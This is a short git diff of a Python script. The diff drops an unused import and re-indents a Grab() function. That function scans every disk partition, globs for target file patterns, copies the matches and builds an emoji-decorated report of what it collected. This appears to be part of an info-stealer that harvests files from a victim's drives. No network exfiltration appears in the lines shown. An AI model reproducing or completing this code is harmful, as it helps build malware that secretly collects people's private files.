@@ -1,4 +1,4 @@
-from os import environ,chdir,makedirs
+from os import chdir,makedirs
 from psutil import disk_partitions
 from pathlib import Path
 from os.path import getsize, join
@@ -44,15 +44,15 @@ def Grab():
 
         drives = disk_partitions()
         for drive in drives:
-                for i in range(len(filesGrab)):
-                    try:
-                        pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
-                    except Exception as e:
-                        Log(drive+" search "+e)
-                    try:
-                        filesGrab[i][1]= Copy(pathes,filesGrab[i][0],filesGrab[i][1])
-                    except Exception as e:
-                        Log(drive+" copy "+e)
+            for i in range(len(filesGrab)):
+                try:
+                    pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
+                except Exception as e:
+                    Log(drive+" search "+e)
+                try:
+                    filesGrab[i][1]= Copy(pathes,filesGrab[i][0],filesGrab[i][1])
+                except Exception as e:
+                    Log(drive+" copy "+e)
         for i in range(len(filesGrab)):
             msgInfo +=f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}"
         return msgInfo
